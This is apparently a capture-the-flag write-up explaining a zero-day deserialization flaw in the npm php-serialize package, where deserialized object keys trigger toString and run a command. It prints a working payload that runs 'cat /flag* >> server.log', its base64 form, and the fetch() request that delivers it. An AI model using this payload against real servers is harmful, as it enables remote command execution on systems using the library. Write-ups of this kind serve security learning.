
## Zero Day Info

This challenge takes advantage of an undisclosed (at the time of the competition) zero day vulnerability on the `php-serialize` [npm package](https://www.npmjs.com/package/php-serialize). While parsing the given serialised payload, the library handles object keys as serialised objects (while in javascript they are always converted to strings), thus when added on an object, the `toString` method will be executed automatically to convert them to a string.

## Exploit

Generate a serilized object that when loaded will execute the toString and the command will be executed:
```
$ node ./gen_payload.js
Serialized command: C:7:"Command":49:{{"p":{"cmd":"cat /flag* >> server.log"},"s":null}}
Serialized object: a:1:{s:11:"exploit-key";N;}
Exploit payload: a:1:{C:7:"Command":49:{{"p":{"cmd":"cat /flag* >> server.log"},"s":null}};N;}
Exploit payload in base64: YToxOntDOjc6IkNvbW1hbmQiOjQ5Ont7InAiOnsiY21kIjoiY2F0IC9mbGFnKiA+PiBzZXJ2ZXIubG9nIn0sInMiOm51bGx9fTtOO30=
Exploit was executed successfully
```

For the given example exploit, the flag will be saved on the server.log file.

The payload can be send using (it will return an error):
```javascript
fetch("/", {
  "headers": {
    "content-type": "text/plain;charset=UTF-8"
  },
  "body": btoa('a:1:{C:7:"Command":49:{{"p":{"cmd":"cat /flag* >> server.log"},"s":null}};N;}'),
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```

But if we run the server log command, the flag will be returned inside the `server.log`:
```
[2025-07-06T06:18:53.311Z] Server listening on http://localhost:1337
ECSC{n0w_I_r3AlLy_gOt_mA_F1Rt_z3r0-d4y!}
```
